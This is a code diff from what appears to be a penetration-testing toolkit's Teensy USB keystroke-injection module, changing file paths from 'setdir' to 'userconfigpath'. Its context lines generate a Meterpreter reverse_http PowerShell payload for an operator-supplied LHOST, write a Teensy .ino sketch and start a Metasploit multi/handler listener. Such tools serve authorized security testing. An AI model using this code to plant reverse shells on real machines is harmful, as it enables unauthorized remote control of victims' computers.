@@ -25,18 +25,18 @@ if payload == '':
     payload = 'windows/meterpreter/reverse_http'
 
 # create base metasploit payload to pass to powershell.prep
-with open(os.path.join(core.setdir + "metasploit.payload"), 'w') as filewrite:
+with open(os.path.join(core.userconfigpath, "metasploit.payload"), 'w') as filewrite:
     filewrite.write(payload)
 
 ipaddr = input("Enter the IP of the LHOST: ")
 port = input("Enter the port for the LHOST: ")
 
 shellcode = core.generate_powershell_alphanumeric_payload(payload, ipaddr, port, "")
-with open(os.path.join(core.setdir + 'x86.powershell'), 'w') as filewrite:
+with open(os.path.join(core.userconfigpath, 'x86.powershell'), 'w') as filewrite:
     filewrite.write(shellcode)
 
 time.sleep(3)
-with open(os.path.join(core.setdir + "x86.powershell")) as fileopen:
+with open(os.path.join(core.userconfigpath, "x86.powershell")) as fileopen:
     pass
     # read in x amount of bytes
     data_read = int(50)
@@ -153,9 +153,9 @@ Keyboard.send_now();
 
 print("[*] Payload has been extracted. Copying file to root directory under reports/teensy.ino")
 
-if not os.path.isdir(os.path.join(core.setdir + "reports")):
-    os.makedirs(os.path.join(core.setdir + "reports"))
-with open(os.path.join(core.setdir + "reports/teensy.ino"), "w") as filewrite:
+if not os.path.isdir(os.path.join(core.userconfigpath, "reports")):
+    os.makedirs(os.path.join(core.userconfigpath, "reports"))
+with open(os.path.join(core.userconfigpath, "reports/teensy.ino"), "w") as filewrite:
     filewrite.write(teensy)
 choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no] ")
 if choice == "YES":
@@ -173,7 +173,7 @@ if choice == "YES":
     else:
         port = input("Enter the port to connect back on: ")
 
-    with open(os.path.join(core.setdir + "metasploit.answers"), "w") as filewrite:
+    with open(os.path.join(core.userconfigpath, "metasploit.answers"), "w") as filewrite:
         filewrite.write("use multi/handler\n"
                         "set payload {0}\n"
                         "set LHOST {1}\n"
@@ -184,7 +184,7 @@ if choice == "YES":
     print("[*] Launching Metasploit....")
     try:
         child = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path() + "msfconsole"),
-                                                          os.path.join(core.setdir + "metasploit.answers")))
+                                                          os.path.join(core.userconfigpath, "metasploit.answers")))
         child.interact()
     except:
         pass
